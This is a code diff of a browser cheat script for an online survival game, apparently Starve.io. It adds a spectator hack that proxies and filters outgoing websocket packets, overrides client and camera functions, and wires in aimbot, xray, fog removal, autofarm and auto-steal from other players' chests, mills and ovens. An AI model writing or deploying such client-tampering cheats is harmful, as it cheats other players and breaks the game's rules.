                 if (img) ctx.drawImage(img, chest.x + script.user.cam.x - 32, chest.y + script.user.cam.y - 32, 60, 65);
                 ctx.lineWidth = 8;
                 ctx.font = "20px Baloo Paaji";
                 ctx.strokeStyle = "red";
+                ctx.strokeStyle = chest.ally ? "#30ab36" : "red";
                 ctx.fillStyle = "black";
                 if (chest.lock) {
-                    ctx.strokeText(`L`, chest.x + script.user.cam.x - 10, chest.y + script.user.cam.y - 25);
-                    ctx.fillText(`L`, chest.x + script.user.cam.x - 10, chest.y + script.user.cam.y - 25);
+                    ctx.strokeText(`L`, chest.x + script.user.cam.x - 10, chest.y + script.user.cam.y - 17);
+                    ctx.fillText(`L`, chest.x + script.user.cam.x - 10, chest.y + script.user.cam.y - 17);
                 }
                 ctx.strokeStyle = "black";
                 ctx.fillStyle = "white";
@@ -1840,11 +3413,10 @@ function updater() {
             }
         }
 
-
         if (Settings.buildinfo) {
             for (let i = 0; i < extractor_ids.length; ++i) {
                 const spikeType = extractor_ids[i];
-                const extractors = unit()[spikeType];
+                const extractors = units[spikeType];
                 if (script.user.alive) {
                     for (let j = 0; j < extractors.length; j++) {
                         const extractor = extractors[j];
@@ -1862,7 +3434,7 @@ function updater() {
                 }
             }
 
-            mils = unit()[32];
+            mils = units[32];
             for (let i = 0; i < mils.length; ++i) {
                 const mill = mils[i];
                 let x = mill.info;
@@ -1874,15 +3446,15 @@ function updater() {
                 ctx.font = "20px Baloo Paaji";
                 ctx.strokeStyle = "black";
                 ctx.fillStyle = "white";
-                ctx.strokeText(`${x}` + '🌾', mill.x + script.user.cam.x - 10, mill.y + script.user.cam.y - 10);
-                ctx.fillText(`${x}` + '🌾', mill.x + script.user.cam.x - 10, mill.y + script.user.cam.y - 10);
-                ctx.strokeText(`${b}` + '🥣', mill.x + script.user.cam.x - 10, mill.y + script.user.cam.y + 15);
-                ctx.fillText(`${b}` + '🥣', mill.x + script.user.cam.x - 10, mill.y + script.user.cam.y + 15);
+                ctx.strokeText(`${x}` + charWheat, mill.x + script.user.cam.x - 10, mill.y + script.user.cam.y - 10);
+                ctx.fillText(`${x}` + charWheat, mill.x + script.user.cam.x - 10, mill.y + script.user.cam.y - 10);
+                ctx.strokeText(`${b}` + charDough, mill.x + script.user.cam.x - 10, mill.y + script.user.cam.y + 15);
+                ctx.fillText(`${b}` + charDough, mill.x + script.user.cam.x - 10, mill.y + script.user.cam.y + 15);
                 mill
                 ctx.restore();
             }
 
-            ovens = unit()[34];
+            ovens = units[34];
             for (let i = 0; i < ovens.length; ++i) {
                 const oven = ovens[i];
                 let x = oven.info;
@@ -1896,31 +3468,104 @@ function updater() {
                 ctx.font = "20px Baloo Paaji";
                 ctx.strokeStyle = "black";
                 ctx.fillStyle = "white";
-                ctx.strokeText(`${x}` + '🥢', oven.x + script.user.cam.x - 10, oven.y + script.user.cam.y - 25);
-                ctx.fillText(`${x}` + '🥢', oven.x + script.user.cam.x - 10, oven.y + script.user.cam.y - 25);
-                ctx.strokeText(`${m}` + '🥣', oven.x + script.user.cam.x - 10, oven.y + script.user.cam.y - 5);
-                ctx.fillText(`${m}` + '🥣', oven.x + script.user.cam.x - 10, oven.y + script.user.cam.y - 5);
-                ctx.strokeText(`${b}` + '🍞', oven.x + script.user.cam.x - 10, oven.y + script.user.cam.y + 15);
-                ctx.fillText(`${b}` + '🍞', oven.x + script.user.cam.x - 10, oven.y + script.user.cam.y + 15);
+                ctx.strokeText(`${x}` + charWood, oven.x + script.user.cam.x - 10, oven.y + script.user.cam.y - 25);
+                ctx.fillText(`${x}` + charWood, oven.x + script.user.cam.x - 10, oven.y + script.user.cam.y - 25);
+                ctx.strokeText(`${m}` + charDough, oven.x + script.user.cam.x - 10, oven.y + script.user.cam.y - 5);
+                ctx.fillText(`${m}` + charDough, oven.x + script.user.cam.x - 10, oven.y + script.user.cam.y - 5);
+                ctx.strokeText(`${b}` + charBred, oven.x + script.user.cam.x - 10, oven.y + script.user.cam.y + 15);
+                ctx.fillText(`${b}` + charBred, oven.x + script.user.cam.x - 10, oven.y + script.user.cam.y + 15);
 
                 ctx.restore();
             }
 
         }
+    } else {
+        let lootboxsinfo = {};
+        let deathboxinfo = {};
     }
 }
 
-function mainscript() {
+
+function loadSpectator() {
+    requestAnimationFrame(loadSpectator);
+    if (client[Object.keys(client)[0]]) {
+        if (!client[Object.keys(client)[0]]["current"]) {
+            client[Object.keys(client)[0]]["current"] = true;
+            client[Object.keys(client)[0]].send = new Proxy(client[Object.keys(client)[0]].send, {
+                apply: function (target, thisArg, args) {
+                    log('b', args[0])
+
+                    if (args[0][0] == 11 && Settings.spectator.e) {
+                        args[0][1] = 0;
+                        return target.apply(thisArg, args);
+                    }
+
+                    if (Settings.spectator.e) {
+                        if (typeof args[0] != 'string') {
+                            return target.apply(thisArg, args)
+                        }
+                        const obj = JSON.parse(args[0]);
+                        if (obj[0] == 28) {
+                            mp = script.world.fast_units[script.user.uid];
+                            log(mp.x, mp.y)
+                            if (obj[1] <= mp.x + 180 && obj[2] <= mp.y + 180 && obj[1] >= mp.x - 2330 && obj[2] >= mp.y - 1580) {
+                                return target.apply(thisArg, args)
+                            }
+                            return
+                        }
+                    }
+                    return target.apply(thisArg, args);
+                }
+            });
+            const oldFunction = client[Object.keys(client)[68]];
+            client[Object.keys(client)[68]] = function () {
+                if (Settings.spectator.e) return
+                oldFunction.apply(this, arguments);
+            }
+            const userCam = user[Object.keys(user)[28]];
+            log('userCam', userCam)
+            const moveCam = userCam[Object.keys(userCam)[12]];
+            userCam[Object.keys(userCam)[12]] = function () {
+                moveCam.apply(this, arguments);
+                if (Settings.spectator.e) {
+                    user[Object.keys(user)[28]].x += Settings.spectator.x;
+                    user[Object.keys(user)[28]].y += Settings.spectator.y;
+                }
+            }
+        }
+    }
     if (!script.user.alive) return
+
+    if (Settings.spectator.e) {
+        if (Settings.spectator.is_x > 0) Settings.spectator.x += Settings.spectator.s;
+        if (Settings.spectator.is_x < 0) Settings.spectator.x -= Settings.spectator.s;
+        if (Settings.spectator.is_y > 0) Settings.spectator.y += Settings.spectator.s;
+        if (Settings.spectator.is_y < 0) Settings.spectator.y -= Settings.spectator.s;
+    }
+}
+
+
+function mainscript() {
+    if (Settings.TurnOffScript.e) return;
+    PathFinder();
+
+
+
+    if (Settings.dropSword.e) {
+        let mp = myplayer()
+        type = HoldWeapon(mp.right, false);
+        if (type) send([packets.dropall, mp.right])
+    }
+
     if (Settings.AutoBreadPut.e) {
-        var mils = unit()[32];
+        var mils = units[32];
         for (let i = 0; i < mils.length; ++i) {
             if (getdist(script.myPlayer, mils[i]) <= 300) {
                 const pid = mils[i][Object.keys(mils[i])[1]];
                 send([packets.millPut, 10, pid, mils[i].id]);
             }
         }
-        var ovens = unit()[34];
+        var ovens = units[34];
         for (let i = 0; i < ovens.length; ++i) {
             if (getdist(script.myPlayer, ovens[i]) <= 300) {
                 const pid = ovens[i][Object.keys(ovens[i])[1]];
@@ -1930,14 +3575,14 @@ function mainscript() {
         }
     }
     if (Settings.AutoBreadTake.e || Settings.AutoSteal.e) {
-        var mils = unit()[32];
+        var mils = units[32];
         for (let i = 0; i < mils.length; ++i) {
             if (getdist(script.myPlayer, mils[i]) <= 300) {
                 const pid = mils[i][Object.keys(mils[i])[1]];
                 send([packets.millTake, pid, mils[i].id]);
             }
         }
-        var ovens = unit()[34];
+        var ovens = units[34];
         for (let i = 0; i < ovens.length; ++i) {
             if (getdist(script.myPlayer, ovens[i]) <= 300) {
                 const pid = ovens[i][Object.keys(ovens[i])[1]];
@@ -1948,7 +3593,7 @@ function mainscript() {
 
     if (Settings.AutoExtractorPut.e) {
         extractor_ids.forEach((extractorType) => {
-            var extractor = unit()[extractorType];
+            var extractor = units[extractorType];
             if (!chatxterm()) {
                 for (let i = 0; i < extractor.length; ++i) {
                     if (getdist(script.myPlayer, extractor[i]) <= 300) {
@@ -1961,7 +3606,7 @@ function mainscript() {
     }
     if (Settings.AutoExtractorTake.e || Settings.AutoSteal.e) {
         extractor_ids.forEach((extractorType) => {
-            var extractor = unit()[extractorType];
+            var extractor = units[extractorType];
             if (!chatxterm()) {
                 for (let i = 0; i < extractor.length; ++i) {
                     if (getdist(script.myPlayer, extractor[i]) <= 300) {
@@ -1973,7 +3618,7 @@ function mainscript() {
         });
     }
     if (Settings.AutoSteal.e) {
-        var chests = unit()[11];
+        var chests = units[11];
         for (let i = 0; i < chests.length; ++i) {
             if (getdist(script.myPlayer, chests[i]) <= 300) {
                 const pid = chests[i][Object.keys(chests[i])[1]]
@@ -1988,6 +3633,7 @@ function mainscript() {
                 if (inventoryHas(item)[0]) {
                     send([packets.equip, item])
                     isEated = true;
+                    break
                 }
             }
             if (!isEated && Settings.AutoCraft.s) {
@@ -2006,6 +3652,7 @@ function mainscript() {
                 if (inventoryHas(item)[0]) {
                     send([packets.equip, item])
                     isEated = true;
+                    break
                 }
             }
             if (!isEated && Settings.AutoRecycle.s) {
@@ -2016,15 +3663,19 @@ function mainscript() {
             send([packets.recycle, Settings.AutoRecycle.lastrecycle]);
         }
     }
-    if (lastFood[1] == 0 && script.user.gauges.hungry < 35) {
-        for (const item of foodItems) {
-            if (inventoryHas(item)[0]) {
-                send([packets.equip, item]);
-                lastFood[1] += 1;
+    if (Settings.AutoFeed2.e) {
+        if (lastFood[1] == 0 && script.user.gauges.hungry < Settings.AutoFeed2.a) {
+            for (const item of foodItems) {
+                if (inventoryHas(item)[0] && lastFood[0] != script.user.gauges.hungry) {
+                    send([packets.equip, item]);
+                    lastFood[1] += 1;
+                    break
+                }
             }
         }
     }
-    if (Math.abs(lastFood[0] - script.user.gauges.hungry) < 10) {
+
+    if (script.user.gauges.hungry - lastFood[0] < 0) {
         lastFood[1] = 0;
     }
     lastFood[0] = script.user.gauges.hungry;
@@ -2073,13 +3724,21 @@ function mainscript() {
             var spikeid = CurrentSpike;
             break;
         };
+        let angle = Math.floor((((script.myPlayer.angle + Math.PI * 2) % (Math.PI * 2)) * 255) / (Math.PI * 2));
         if (spikeid) {
-            let angle = Math.floor((((script.myPlayer.angle + Math.PI * 2) % (Math.PI * 2)) * 255) / (Math.PI * 2));
-            for (let i = 0; i < 10; i++) {
+            let range = 10;
+            if (Settings.AutoSpikeMode2) range = 9;
+            for (let i = 0; i < range; i++) {
                 send([packets.placeBuild, spikeid, (angle - i * 2 + 255) % 255, 0]);
                 send([packets.placeBuild, spikeid, (angle + i * 2 + 255) % 255, 0]);
             }
+            if (Settings.AutoSpikeMode2) {
+                send([packets.placeBuild, spikeid, (angle) % 255, 1]);
+            }
         };
+        if (Settings.AutoBridge) {
+            send([packets.placeBuild, 125, (angle) % 255, 0]);
+        }
     }
 }
 
@@ -2147,13 +3806,20 @@ let awutosteal = false;
 
 
 function main() {
-    console.log(Settings);
+    Settings.textalert.t = ''
+    Settings.textalert.e = false
+    console.log('Settings', Settings);
+    colors()
     autoBook()
     blizzard()
     updater()
-    colors()
     recycle()
     aimbot()
+    autofarm()
+    setTimeout(loadFog, 100)
+    setTimeout(loadXray, 300)
+    autoresp()
+    loadSpectator()
 
     setInterval(() => {
         mainscript()
@@ -2175,4 +3841,4 @@ function initialize() {
     }
 }
 
-setInterval(initialize, 1200);
+setInterval(initialize, 1500);
